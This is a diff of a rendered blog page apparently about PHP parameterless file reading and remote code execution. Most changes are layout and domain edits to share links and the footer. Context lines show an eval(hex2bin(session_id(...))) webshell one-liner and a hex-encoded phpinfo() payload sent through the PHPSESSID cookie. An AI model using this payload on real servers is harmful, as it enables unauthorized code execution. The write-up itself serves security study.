 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -778,7 +778,7 @@ Leon: phpinfo();
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">eval(hex2bin(session_id(session_start())));
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">eval(hex2bin(session_id(session_start())));
 
 &gt;&gt;&gt; print&#39;phpinfo();&#39;.encode(&#39;hex&#39;)
 706870696e666f28293b
@@ -839,7 +839,7 @@ Cookie: PHPSESSID=706870696e666f28293b
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://clq0.top/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" data-title="PHP无参数读文件和RCE" data-hashtags="RCE"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://clq0.top/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" data-hashtag="RCE"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://clq0.top/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://clq0.top/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" data-title="PHP无参数读文件和RCE"><i class="fab fa-weibo fa-fw"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.h4ck.fun/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" data-title="PHP无参数读文件和RCE" data-via="Le0nsec" data-hashtags="RCE"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.h4ck.fun/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" data-hashtag="RCE"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.h4ck.fun/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://blog.h4ck.fun/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" data-title="PHP无参数读文件和RCE"><i class="fab fa-weibo fa-fw"></i></a></span>
             </div>
         </div>
     </div>
@@ -858,7 +858,7 @@ Cookie: PHPSESSID=706870696e666f28293b
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><a>本网站由</a><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="-blank"><img src="/upyun_logo2.png" width="4%" style="vertical-align:middle"></a><a>提供CDN加速/云存储服务</a></div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                     <span class="icp"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278765080&web_id=1278765080"></script></span></div>
         </div>
     </footer></div>
